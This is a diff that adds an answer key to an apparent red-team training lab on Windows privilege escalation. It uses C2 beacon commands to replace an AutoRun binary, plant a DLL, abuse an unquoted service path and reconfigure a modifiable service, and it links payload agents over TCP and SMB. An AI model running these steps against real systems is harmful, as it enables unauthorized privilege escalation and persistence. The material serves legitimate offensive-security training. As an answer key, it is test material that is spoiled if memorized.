@@ -140,3 +140,90 @@ Using information from LAB 4, exploit the unquoted service path vulnerability.
 Using information from LAB 4, exploit the modifiable service. Use `noconsolation` with `C:\DevTools\accesschk64.exe` to confirm access, then use `sc_config` to reconfigure the service binary path. Create a `SMB Service EXE` so that it will interfere with `Port 9001`
 
 ---
+
+## Answers
+
+<details>
+<summary>Task 1 — Part 4 (AutoRun)</summary>
+
+```bash
+beacon> cacls "C:\Program Files\Document Processing Engine" # Everyone:F allows modification
+beacon> noconsolation --local C:\DevTools\accesschk64.exe -ac -a "/accepteula -nobanner -uwv seth.hawkins \"C:\Program Files\Document Processing Engine\""
+# Alternative — load from Kali (download accesschk64.exe to loot first):
+beacon> noconsolation -f /home/kali/AdaptixProjects/<YOUR PROJECT>/loot/accesschk64.exe -ac -a "/accepteula -nobanner -uwv seth.hawkins \"C:\Program Files\Document Processing Engine\""
+beacon> cd "C:\Program Files\Document Processing Engine"
+beacon> cp docengine.exe docengine.bak
+beacon> rm docengine.exe
+beacon> upload <payload> docengine.exe
+```
+
+</details>
+
+---
+
+<details>
+<summary>Task 2 — Part 1 (DLL Hijack)</summary>
+
+```bash
+beacon> upload ~/CS26AdaptixClass/labs/LAB5/payload.dll C:\Temp\helper.dll
+# or
+beacon> upload ~/CS26AdaptixClass/labs/LAB5/payload.dll "C:\Program Files\Print Workflow Service\helper.dll"
+beacon> sc_stop PrintWorkflowSvc .
+beacon> sc_start PrintWorkflowSvc .
+beacon> netstat
+beacon> link tcp 192.168.57.31 9001
+```
+
+</details>
+
+---
+
+<details>
+<summary>Task 2 — Part 2 (Unquoted Service Path)</summary>
+
+```bash
+cd /opt/beatrice
+source .venv/bin/activate 
+python3 beatrice.py /home/kali/AdaptixProjects/<YOUR PROJECT>/Payloads/svc_agent_tcp9001.x64.exe
+```
+
+- Confirm vulnerability with `privcheck unquotedsvc`
+
+```bash
+beacon> sc_stop entworkflowsvc .
+beacon> upload ~/AdaptixProjects/<YOUR PROJECT>/Payloads/svc_agent_tcp9001.x64.exe "C:\Program Files\Enterprise Workflow Engine\System.exe"
+beacon> sc_start entworkflowsvc .
+beacon> netstat
+beacon> link tcp 192.168.57.31 9001
+```
+
+</details>
+
+---
+
+<details>
+<summary>Task 2 — Part 3 (Modifiable Service)</summary>
+
+- SharpUp identifies `diaghostsvc` as a modifiable service
+- Generate SMB payload 
+    - Agent: Beacon
+    - Format: Service Exe
+- Run generated service payload through `beatrice` and move to Windows 11 host      
+- Confirm `SERVICE_CHANGE_CONFIG` is available (`-ac` allocates a console so accesschk runs in a child process; `-nobanner` suppresses null version output):
+
+```bash
+beacon> noconsolation --local C:\DevTools\accesschk64.exe -ac -a "/accepteula -nobanner -uwcqv seth.hawkins diaghostsvc"
+# Alternative — load from Kali (download accesschk64.exe to loot first):
+beacon> noconsolation -f /home/kali/AdaptixProjects/<YOUR PROJECT>/loot/accesschk64.exe -ac -a "/accepteula -nobanner -uwcqv seth.hawkins diaghostsvc"
+```
+
+- Use `sc_config` to set the binary path to an uploaded service binary
+
+```bash
+beacon> sc_qc diaghostsvc .
+beacon> sc_config diaghostsvc "C:\DevTools\smb.exe" --start auto
+beacon> sc_start diaghostsvc .
+beacon> link smb 192.168.57.31 mojo.46820.49044.13993226574651151918
+```
+
+</details>
